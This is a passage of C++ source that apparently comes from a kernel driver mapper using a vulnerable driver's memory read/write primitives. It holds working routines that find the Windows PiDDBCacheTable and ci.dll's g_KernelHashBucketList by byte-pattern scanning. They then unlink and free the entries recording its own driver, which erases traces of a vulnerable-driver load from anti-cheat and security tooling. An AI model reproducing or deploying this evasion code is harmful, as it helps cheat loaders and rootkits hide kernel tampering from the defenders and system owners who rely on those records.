	ULONG_PTR Instr = (ULONG_PTR)Instruction;
	LONG RipOffset = 0;
	if (!ReadMemory(Instr + OffsetOffset, &RipOffset, sizeof(LONG))) {
		return nullptr;
	}
	PVOID ResolvedAddr = (PVOID)(Instr + InstructionSize + RipOffset);
	return ResolvedAddr;
}

bool mod::drv::ExAcquireResourceExclusiveLite(PVOID Resource, BOOLEAN wait) {
	if (!Resource)
		return 0;

	static uint64_t kernel_ExAcquireResourceExclusiveLite = GetKernelModuleExport(mod::drv::ntoskrnlAddr, "ExAcquireResourceExclusiveLite");

	if (!kernel_ExAcquireResourceExclusiveLite) {
		LOG(L"[!] Failed to find ExAcquireResourceExclusiveLite" << std::endl);
		return 0;
	}

	BOOLEAN out;

	return (CallKernelFunction(&out, kernel_ExAcquireResourceExclusiveLite, Resource, wait) && out);
}

bool mod::drv::ExReleaseResourceLite(PVOID Resource) {
	if (!Resource)
		return false;

	static uint64_t kernel_ExReleaseResourceLite = GetKernelModuleExport(mod::drv::ntoskrnlAddr, "ExReleaseResourceLite");

	if (!kernel_ExReleaseResourceLite) {
		LOG(L"[!] Failed to find ExReleaseResourceLite" << std::endl);
		return false;
	}

	return CallKernelFunction<void>(nullptr, kernel_ExReleaseResourceLite, Resource);
}

BOOLEAN mod::drv::RtlDeleteElementGenericTableAvl(PVOID Table, PVOID Buffer) {
	if (!Table)
		return false;

	static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(mod::drv::ntoskrnlAddr, "RtlDeleteElementGenericTableAvl");

	if (!kernel_RtlDeleteElementGenericTableAvl) {
		LOG(L"[!] Failed to find RtlDeleteElementGenericTableAvl" << std::endl);
		return false;
	}

	bool out;
	return (CallKernelFunction(&out, kernel_RtlDeleteElementGenericTableAvl, Table, Buffer) && out);
}

PVOID mod::drv::RtlLookupElementGenericTableAvl(nt::PRTL_AVL_TABLE Table, PVOID Buffer) {
	if (!Table)
		return nullptr;

	static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(mod::drv::ntoskrnlAddr, "RtlLookupElementGenericTableAvl");

	if (!kernel_RtlDeleteElementGenericTableAvl) {
		LOG(L"[!] Failed to find RtlLookupElementGenericTableAvl" << std::endl);
		return nullptr;
	}

	PVOID out;

	if (!CallKernelFunction(&out, kernel_RtlDeleteElementGenericTableAvl, Table, Buffer))
		return 0;

	return out;
}

nt::PiDDBCacheEntry* mod::drv::LookupEntry(nt::PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t * name) {

	nt::PiDDBCacheEntry localentry{};
	localentry.TimeDateStamp = timestamp;
	localentry.DriverName.Buffer = (PWSTR)name;
	localentry.DriverName.Length = (USHORT)(wcslen(name) * 2);
	localentry.DriverName.MaximumLength = localentry.DriverName.Length + 2;

	return (nt::PiDDBCacheEntry*)RtlLookupElementGenericTableAvl(PiDDBCacheTable, (PVOID)&localentry);
}

bool mod::drv::ClearPiDDBCacheTable() { 

#ifdef PDB_OFFSETS
	auto PiDDBLockOffset = KDSymbolsHandler::GetInstance()->GetOffset(L"PiDDBLock");
	if (!PiDDBLockOffset)
	{
		LOG(L"[-] Warning PiDDBLock not found" << std::endl);
		return false;
	}

	auto PiDDBCacheTableOffset = KDSymbolsHandler::GetInstance()->GetOffset(L"PiDDBCacheTable");
	if (!PiDDBCacheTableOffset)
	{
		LOG(L"[-] Warning PiDDBCacheTable not found" << std::endl);
		return false;
	}

	PVOID PiDDBLock = (PVOID)(mod::drv::ntoskrnlAddr + PiDDBLockOffset);
	nt::PRTL_AVL_TABLE PiDDBCacheTable = (nt::PRTL_AVL_TABLE)(mod::drv::ntoskrnlAddr + PiDDBCacheTableOffset);
#else
	auto PiDDBLockPtr = FindPatternInSectionAtKernel("PAGE", mod::drv::ntoskrnlAddr, (PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x66\xFF\x88\x00\x00\x00\x00\xB2\x01\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", "xxxxxx????xxxxx????xxx????xxxxx????x????xx?x"); 
	auto PiDDBCacheTablePtr = FindPatternInSectionAtKernel("PAGE", mod::drv::ntoskrnlAddr, (PUCHAR)"\x66\x03\xD2\x48\x8D\x0D", "xxxxxx"); 

	if (PiDDBLockPtr == NULL) { 
		PiDDBLockPtr = FindPatternInSectionAtKernel("PAGE", mod::drv::ntoskrnlAddr, (PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\x48\x85\xC9\x0F\x85\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\xE8", "xxx????xxxxx????xxx????x????x"); 
		if (PiDDBLockPtr == NULL) {
			PiDDBLockPtr = FindPatternInSectionAtKernel("PAGE", mod::drv::ntoskrnlAddr, (PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xB2\x01\x66\xFF\x88\x00\x00\x00\x00\x90\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", "xxxxxx????xxxxx????xxx????xxxxx????xx????xx?x"); 
			if (PiDDBLockPtr == NULL) {
				LOG(L"[-] Warning PiDDBLock not found" << std::endl);
				return false;
			}
			else {
				LOG(L"[+] PiDDBLock found with third pattern" << std::endl);
				PiDDBLockPtr += 19;
			}
		}
		else {
			LOG(L"[+] PiDDBLock found with second pattern" << std::endl);
			PiDDBLockPtr += 16; 
		}
	}
	else {
		PiDDBLockPtr += 28; 
	}

	if (PiDDBCacheTablePtr == NULL) {
		PiDDBCacheTablePtr = FindPatternInSectionAtKernel("PAGE", mod::drv::ntoskrnlAddr, (PUCHAR)"\x48\x8B\xF9\x33\xC0\x48\x8D\x0D", "xxxxxxxx"); 
		if (PiDDBCacheTablePtr == NULL) {
			LOG(L"[-] Warning PiDDBCacheTable not found" << std::endl);
			return false;
		}
		else {
			LOG(L"[+] PiDDBCacheTable found with second pattern" << std::endl);
			PiDDBCacheTablePtr += 2;
		}
	}

	LOG("[+] PiDDBLock Ptr 0x" << std::hex << PiDDBLockPtr << std::endl);
	LOG("[+] PiDDBCacheTable Ptr 0x" << std::hex << PiDDBCacheTablePtr << std::endl);

	PVOID PiDDBLock = ResolveRelativeAddress((PVOID)PiDDBLockPtr, 3, 7);
	nt::PRTL_AVL_TABLE PiDDBCacheTable = (nt::PRTL_AVL_TABLE)ResolveRelativeAddress((PVOID)PiDDBCacheTablePtr, 6, 10);
#endif

	if (!ExAcquireResourceExclusiveLite(PiDDBLock, true)) {
		LOG(L"[-] Can't lock PiDDBCacheTable" << std::endl);
		return false;
	}
	LOG(L"[+] PiDDBLock Locked" << std::endl);

	auto n = GetDriverNameW();

	auto timestamp = mod::pe::GetNtHeaders((void*)mod::drv_res::driver)->FileHeader.TimeDateStamp;

	nt::PiDDBCacheEntry* pFoundEntry = (nt::PiDDBCacheEntry*)LookupEntry(PiDDBCacheTable, timestamp, n.c_str());
	if (pFoundEntry == nullptr) {
		LOG(L"[-] Not found in cache" << std::endl);
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}

	PLIST_ENTRY prev;
	if (!ReadMemory((uintptr_t)pFoundEntry + (offsetof(struct nt::_PiDDBCacheEntry, List.Blink)), &prev, sizeof(_LIST_ENTRY*))) {
		LOG(L"[-] Can't get prev entry" << std::endl);
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}
	PLIST_ENTRY next;
	if (!ReadMemory((uintptr_t)pFoundEntry + (offsetof(struct nt::_PiDDBCacheEntry, List.Flink)), &next, sizeof(_LIST_ENTRY*))) {
		LOG(L"[-] Can't get next entry" << std::endl);
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}

	LOG("[+] Found Table Entry = 0x" << std::hex << pFoundEntry << std::endl);

	if (!WriteMemory((uintptr_t)prev + (offsetof(struct _LIST_ENTRY, Flink)), &next, sizeof(_LIST_ENTRY*))) {
		LOG(L"[-] Can't set next entry" << std::endl);
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}
	if (!WriteMemory((uintptr_t)next + (offsetof(struct _LIST_ENTRY, Blink)), &prev, sizeof(_LIST_ENTRY*))) {
		LOG(L"[-] Can't set prev entry" << std::endl);
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}

	if (!RtlDeleteElementGenericTableAvl(PiDDBCacheTable, pFoundEntry)) {
		LOG(L"[-] Can't delete from PiDDBCacheTable" << std::endl);
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}

	ULONG cacheDeleteCount = 0;
	ReadMemory((uintptr_t)PiDDBCacheTable + (offsetof(struct nt::_RTL_AVL_TABLE, DeleteCount)), &cacheDeleteCount, sizeof(ULONG));
	if (cacheDeleteCount > 0) {
		cacheDeleteCount--;
		WriteMemory((uintptr_t)PiDDBCacheTable + (offsetof(struct nt::_RTL_AVL_TABLE, DeleteCount)), &cacheDeleteCount, sizeof(ULONG));
	}

	ExReleaseResourceLite(PiDDBLock);

	LOG(L"[+] PiDDBCacheTable Cleaned" << std::endl);

	return true;
}

uintptr_t mod::drv::FindPatternAtKernel(uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask) {
	if (!dwAddress) {
		LOG(L"[-] No module address to find pattern" << std::endl);
		return 0;
	}

	if (dwLen > 1024 * 1024 * 1024) { 
		LOG(L"[-] Can't find pattern, Too big section" << std::endl);
		return 0;
	}

	auto sectionData = std::make_unique<BYTE[]>(dwLen);
	if (!ReadMemory(dwAddress, sectionData.get(), dwLen)) {
		LOG(L"[-] Read failed in FindPatternAtKernel" << std::endl);
		return 0;
	}

	auto result = mod::utl::FindPattern((uintptr_t)sectionData.get(), dwLen, bMask, szMask);

	if (result <= 0) {
		return 0;
	}
	result = dwAddress - (uintptr_t)sectionData.get() + result;
	return result;
}

uintptr_t mod::drv::FindSectionAtKernel(const char* sectionName, uintptr_t modulePtr, PULONG size) {
	if (!modulePtr)
		return 0;
	BYTE headers[0x1000];
	if (!ReadMemory(modulePtr, headers, 0x1000)) {
		LOG(L"[-] Can't read module headers" << std::endl);
		return 0;
	}
	ULONG sectionSize = 0;
	uintptr_t section = (uintptr_t)mod::utl::FindSection(sectionName, (uintptr_t)headers, &sectionSize);
	if (!section || !sectionSize) {
		LOG(L"[-] Can't find section" << std::endl);
		return 0;
	}
	if (size)
		*size = sectionSize;
	return section - (uintptr_t)headers + modulePtr;
}

uintptr_t mod::drv::FindPatternInSectionAtKernel(const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask) {
	ULONG sectionSize = 0;
	uintptr_t section = FindSectionAtKernel(sectionName, modulePtr, &sectionSize);
	return FindPatternAtKernel(section, sectionSize, bMask, szMask);
}

bool mod::drv::ClearKernelHashBucketList() {
	uint64_t ci = mod::utl::GetKernelModuleAddress("ci.dll");
	if (!ci) {
		LOG(L"[-] Can't Find ci.dll module address" << std::endl);
		return false;
	}

#ifdef PDB_OFFSETS
	auto g_KernelHashBucketListOffset = KDSymbolsHandler::GetInstance()->GetOffset(L"g_KernelHashBucketList");
	if (!g_KernelHashBucketListOffset)
	{
		LOG(L"[-] Can't Find g_KernelHashBucketList Offset" << std::endl);
		return false;
	}

	auto g_HashCacheLockOffset = KDSymbolsHandler::GetInstance()->GetOffset(L"g_HashCacheLock");
	if (!g_KernelHashBucketListOffset)
	{
		LOG(L"[-] Can't Find g_HashCacheLock Offset" << std::endl);
		return false;
	}

	PVOID g_KernelHashBucketList = (PVOID)(ci + g_KernelHashBucketListOffset);
	PVOID g_HashCacheLock = (PVOID)(ci + g_HashCacheLockOffset);
#else
	auto sig = FindPatternInSectionAtKernel("PAGE", ci, PUCHAR("\x48\x8B\x1D\x00\x00\x00\x00\xEB\x00\xF7\x43\x40\x00\x20\x00\x00"), "xxx????x?xxxxxxx");
	if (!sig) {
		LOG(L"[-] Can't Find g_KernelHashBucketList" << std::endl);
		return false;
	}
	auto sig2 = FindPatternAtKernel((uintptr_t)sig - 50, 50, PUCHAR("\x48\x8D\x0D"), "xxx");
	if (!sig2) {
		LOG(L"[-] Can't Find g_HashCacheLock" << std::endl);
		return false;
	}
	const auto g_KernelHashBucketList = ResolveRelativeAddress((PVOID)sig, 3, 7);
	const auto g_HashCacheLock = ResolveRelativeAddress((PVOID)sig2, 3, 7);
	if (!g_KernelHashBucketList || !g_HashCacheLock)
	{
		LOG(L"[-] Can't Find g_HashCache relative address" << std::endl);
		return false;
	}
#endif

	LOG(L"[+] g_KernelHashBucketList Found 0x" << std::hex << g_KernelHashBucketList << std::endl);

	if (!ExAcquireResourceExclusiveLite(g_HashCacheLock, true)) {
		LOG(L"[-] Can't lock g_HashCacheLock" << std::endl);
		return false;
	}
	LOG(L"[+] g_HashCacheLock Locked" << std::endl);

	nt::HashBucketEntry* prev = (nt::HashBucketEntry*)g_KernelHashBucketList;
	nt::HashBucketEntry* entry = 0;
	if (!ReadMemory((uintptr_t)prev, &entry, sizeof(entry))) {
		LOG(L"[-] Failed to read first g_KernelHashBucketList entry!" << std::endl);
		if (!ExReleaseResourceLite(g_HashCacheLock)) {
			LOG(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
		}
		return false;
	}
	if (!entry) {
		LOG(L"[!] g_KernelHashBucketList looks empty!" << std::endl);
		if (!ExReleaseResourceLite(g_HashCacheLock)) {
			LOG(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
		}
		return true;
	}

	std::wstring wdname = GetDriverNameW();
	std::wstring search_path = GetDriverPath();
	SIZE_T expected_len = (search_path.length() - 2) * 2;

	while (entry) {

		USHORT wsNameLen = 0;
		if (!ReadMemory((uintptr_t)entry + offsetof(nt::HashBucketEntry, DriverName.Length), &wsNameLen, sizeof(wsNameLen)) || wsNameLen == 0) {
			LOG(L"[-] Failed to read g_KernelHashBucketList entry text len!" << std::endl);
			if (!ExReleaseResourceLite(g_HashCacheLock)) {
				LOG(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
			}
			return false;
		}

		if (expected_len == wsNameLen) {
			wchar_t* wsNamePtr = 0;
			if (!ReadMemory((uintptr_t)entry + offsetof(nt::HashBucketEntry, DriverName.Buffer), &wsNamePtr, sizeof(wsNamePtr)) || !wsNamePtr) {
				LOG(L"[-] Failed to read g_KernelHashBucketList entry text ptr!" << std::endl);
				if (!ExReleaseResourceLite(g_HashCacheLock)) {
					LOG(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
				}
				return false;
			}

			auto wsName = std::make_unique<wchar_t[]>((ULONG64)wsNameLen / 2ULL + 1ULL);
			if (!ReadMemory((uintptr_t)wsNamePtr, wsName.get(), wsNameLen)) {
				LOG(L"[-] Failed to read g_KernelHashBucketList entry text!" << std::endl);
				if (!ExReleaseResourceLite(g_HashCacheLock)) {
					LOG(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
				}
				return false;
			}

			size_t find_result = std::wstring(wsName.get()).find(wdname);
			if (find_result != std::wstring::npos) {
				LOG(L"[+] Found In g_KernelHashBucketList: " << std::wstring(&wsName[find_result]) << std::endl);
				nt::HashBucketEntry* Next = 0;
				if (!ReadMemory((uintptr_t)entry, &Next, sizeof(Next))) {
					LOG(L"[-] Failed to read g_KernelHashBucketList next entry ptr!" << std::endl);
					if (!ExReleaseResourceLite(g_HashCacheLock)) {
						LOG(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				}

				if (!WriteMemory((uintptr_t)prev, &Next, sizeof(Next))) {
					LOG(L"[-] Failed to write g_KernelHashBucketList prev entry ptr!" << std::endl);
					if (!ExReleaseResourceLite(g_HashCacheLock)) {
						LOG(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				}

				if (!FreePool((uintptr_t)entry)) {
					LOG(L"[-] Failed to clear g_KernelHashBucketList entry pool!" << std::endl);
					if (!ExReleaseResourceLite(g_HashCacheLock)) {
						LOG(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				}
				LOG(L"[+] g_KernelHashBucketList Cleaned" << std::endl);
				if (!ExReleaseResourceLite(g_HashCacheLock)) {
					LOG(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					return false;
				}
				return true;
			}
		}
		prev = entry;

		if (!ReadMemory((uintptr_t)entry, &entry, sizeof(entry))) {
			LOG(L"[-] Failed to read g_KernelHashBucketList next entry!" << std::endl);
			if (!ExReleaseResourceLite(g_HashCacheLock)) {
				LOG(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
			}
			return false;
		}
	}

	if (!ExReleaseResourceLite(g_HashCacheLock)) {
		LOG(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
	}
	return false;
}